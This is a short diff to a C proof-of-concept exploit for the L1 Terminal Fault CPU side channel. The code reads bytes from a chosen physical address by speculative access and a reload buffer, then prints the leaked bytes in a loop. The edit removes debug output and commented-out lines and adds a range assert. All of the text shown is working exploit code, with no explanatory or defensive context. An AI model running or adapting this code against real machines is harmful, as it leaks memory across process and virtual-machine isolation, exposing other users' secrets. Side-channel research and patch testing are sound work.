@@ -116,7 +116,6 @@ void l1tf_leak_buffer_modify(leak_addr_t *leak, uintptr_t ptr) {
 
   // This leak addr is already point to the corrent page frame
   // number, so there is no need to modify the page table.
-  fprintf(stderr, "PFN: %lx\n", pfn);
   if (leak->current_pfn == pfn) {
     return;
   }
@@ -179,11 +178,11 @@ int main(int argc, char *argv[argc]) {
 
   printf("Results physcial addr %lx:\n", phys_addr);
   size_t start = (phys_addr & 0xfff);
+  assert(start + length < 0xfff);
+
   while (1) {
     for (size_t j = start; j < start + length; j += 1) {
       void *leak_addr = (char *)leak.leak + j;
-      // printf("%lx\n", leak_addr);
-      // l1tf_leak_buffer_modify(&leak, (uintptr_t)leak_addr);
       uint8_t leaked_byte = l1tf_full(leak_addr, *reload_buffer);
 
       if (leaked_byte != 0) {
@@ -192,8 +191,6 @@ int main(int argc, char *argv[argc]) {
     }
 
     for (size_t i = 0; i < length; ++i) {
-      // if (isalnum(results[i]))
-      // fprintf(stderr, "%c", results[i]);
       printf("%02x ", results[i]);
     }
     printf("\r");
